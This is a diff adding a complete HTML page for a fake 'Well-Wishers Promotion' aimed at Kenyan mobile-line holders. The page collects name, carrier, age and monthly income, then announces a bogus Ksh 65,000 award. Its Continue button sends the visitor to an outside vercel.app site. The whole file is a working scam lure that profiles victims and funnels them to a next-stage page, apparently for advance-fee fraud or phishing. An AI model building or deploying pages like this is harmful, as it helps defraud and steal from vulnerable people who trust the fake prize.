@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>support</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+    }
+    h1 {
+        text-align: center;
+        color: #333;
+    }
+    form {
+        max-width: 500px;
+        margin: 20px auto;
+        background: #fff;
+        padding: 20px;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    label {
+        display: block;
+        margin-bottom: 10px;
+        color: #666;
+    }
+    input[type="text"],
+    input[type="number"],
+    select,
+    textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+        margin-bottom: 20px;
+    }
+    button {
+        background-color: #4CAF50;
+        color: white;
+        padding: 14px 20px;
+        margin: 8px 0;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        width: 100%;
+    }
+    button:hover {
+        background-color: #45a049;
+    }
+    .award-container {
+        background-color: #c9f7c5;
+        padding: 20px;
+        border-radius: 5px;
+        margin-top: 20px;
+    }
+    .award-message {
+        border: 2px solid green;
+        padding: 10px;
+        border-radius: 5px;
+    }
+</style>
+</head>
+<body>
+    <h1>WELL-WISHERS PROMOTION</h1>
+    <form action="#">
+        <div>
+            <label for="full_names">1. What is your full name as registered in your line?</label>
+            <input type="text" id="full_names" name="full_names" required>
+        </div>
+        <div>
+            <label for="service_provider">2. Which service provider is your line with?</label>
+            <select id="service_provider" name="service_provider" required>
+                <option value="">Select Service Provider</option>
+                <option value="Safaricom">Safaricom</option>
+                <option value="Airtel">Airtel</option>
+                <option value="Telkom">Telkom</option>
+                <option value="Faiba">Faiba</option>
+            </select>
+        </div>
+        <div>
+            <label for="age">3. How old are you?</label>
+            <input type="number" id="age" name="age" required>
+        </div>
+        <div>
+            <label for="income">4. What is your approximate monthly income (Ksh)?</label>
+            <input type="number" id="income" name="income" required>
+        </div>
+        <button type="submit">Submit</button>
+    </form>
+
+    <div class="award-message" id="awardMessage" style="display:none;">
+        <p>CONGRATULATIONS <span id="userName"></span>, YOU ARE IN A GOOD TRUCK OF BEING AWARDED KSH 65,000 FROM WELL-WISHERS COMPANY I.</p>
+        <button onclick="redeemAward()">Continue</button>
+    </div>
+
+    <script>
+        function redeemAward() {
+            // Redirect to another page
+            window.location.href = "https://febb-nine.vercel.app/";
+        }
+
+        // Extract user's name and display the award message
+        const form = document.querySelector('form');
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission
+            const userName = document.getElementById('full_names').value;
+            const awardMessage = document.getElementById('awardMessage');
+            const userNameSpan = document.getElementById('userName');
+            userNameSpan.textContent = userName;
+            awardMessage.style.display = 'block'; // Show the award message
+        });
+    </script>
+</body>
+</html>
